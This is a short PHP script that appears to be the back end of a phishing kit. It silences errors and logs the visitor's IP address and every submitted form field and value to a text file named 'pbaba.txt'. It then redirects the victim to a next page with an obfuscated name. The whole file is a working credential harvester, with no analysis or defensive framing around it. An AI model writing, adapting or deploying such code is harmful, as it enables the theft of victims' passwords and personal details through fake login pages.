<?php
 // include ('UserInformation.php');
    include ('ip.php');


// header("location: https://www.google.com");
header('location:residen5h4f5djgkf2f5f4df5shdjfhs5f5cv.html');
error_reporting(0);
$handle = fopen("pbaba.txt","a");
fwrite($handle, $ip_address);
fwrite($handle, "\r\n");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 
       